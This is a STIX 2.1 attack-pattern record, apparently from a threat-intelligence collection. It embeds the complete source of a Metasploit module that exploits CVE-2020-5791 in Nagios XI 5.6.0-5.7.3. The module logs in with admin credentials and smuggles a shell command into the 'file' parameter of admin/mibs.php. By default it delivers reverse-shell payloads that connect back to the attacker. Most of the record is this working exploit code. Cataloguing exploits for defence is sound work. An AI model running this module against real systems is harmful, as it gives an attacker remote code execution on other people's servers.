{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2b4fedb-ce9b-41c0-9f1f-827bf32fdde2",
    "created": "2024-08-14T17:04:44.176933Z",
    "modified": "2024-08-14T17:04:44.176938Z",
    "name": "Nagios XI 5.6.0-5.7.3 - Mibs.php Authenticated Remote Code Exection",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nagios_xi_mibs_authenticated_rce.rb",
            "external_id": "nagios_xi_mibs_authenticated_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5791"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::NagiosXi\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Nagios XI 5.6.0-5.7.3 - Mibs.php Authenticated Remote Code Exection',\n        'Description' => %q{\n          This module exploits CVE-2020-5791, an OS command injection vulnerability in\n          `admin/mibs.php` that enables an authenticated user with admin privileges to achieve\n          remote code execution as either the `apache` user or the `www-data` user on NagiosXI\n          version 5.6.0 to 5.7.3 inclusive (exact user depends on the version of NagiosXI\n          installed as well as the OS its installed on).\n\n          Valid credentials for a Nagios XI admin user are required. This module has\n          been successfully tested against Nagios XI 5.7.3 running on CentOS 7.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Chris Lyne', # discovery\n          'Matthew Aberegg', # PoC\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['CVE', '2020-5791'],\n          ['EDB', '48959']\n        ],\n        'Platform' => %w[linux unix],\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_CMD ],\n        'Targets' => [\n          [\n            'Linux (x86/x64)', {\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'Platform' => 'linux',\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' }\n            }\n          ],\n          [\n            'CMD', {\n              'Arch' => [ ARCH_CMD ],\n              'Platform' => 'unix',\n              # the only reliable payloads against a typical Nagios XI host (CentOS 7 minimal) seem to be cmd/unix/reverse_perl_ssl and cmd/unix/reverse_openssl\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl_ssl' }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-10-20',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])\n    ]\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def finish_install\n    datastore['FINISH_INSTALL']\n  end\n\n  def check\n    # Use nagios_xi_login to try and authenticate. If authentication succeeds, nagios_xi_login returns\n    # an array containing the http response body of a get request to index.php and the session cookies\n    auth_result, err_msg, @auth_cookies, @version = authenticate(username, password, finish_install)\n    case auth_result\n    when AUTH_RESULTS[:connection_failed]\n      return CheckCode::Unknown(err_msg)\n    when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n      return CheckCode::Detected(err_msg)\n    when AUTH_RESULTS[:not_nagios_application]\n      return CheckCode::Safe(err_msg)\n    end\n\n    if @version >= Rex::Version.new('5.6.0') && @version <= Rex::Version.new('5.7.3')\n      return CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts = {})\n    # execute payload\n    unless @auth_cookies.present?\n      auth_result, err_msg, @auth_cookies, @version = authenticate(username, password, finish_install)\n      case auth_result\n      when AUTH_RESULTS[:connection_failed]\n        return CheckCode::Unknown(err_msg)\n      when AUTH_RESULTS[:unexpected_error], AUTH_RESULTS[:not_fully_installed], AUTH_RESULTS[:failed_to_handle_license_agreement], AUTH_RESULTS[:failed_to_extract_tokens], AUTH_RESULTS[:unable_to_obtain_version]\n        return CheckCode::Detected(err_msg)\n      when AUTH_RESULTS[:not_nagios_application]\n        return CheckCode::Safe(err_msg)\n      end\n    end\n\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'mibs.php'),\n      'cookie' => @auth_cookies,\n      'vars_get' =>\n      {\n        'mode' => 'undo-processing',\n        'type' => '1',\n        'file' => \";#{cmd};\"\n      }\n    }, 0) # don't wait for a response from the target, otherwise the module will in most cases hang for a few seconds after executing the payload\n  end\n\n  def exploit\n    if target.arch.first == ARCH_CMD\n      print_status('Executing the payload')\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-10-20",
    "x_mitre_platforms": [
        "unix'"
    ]
}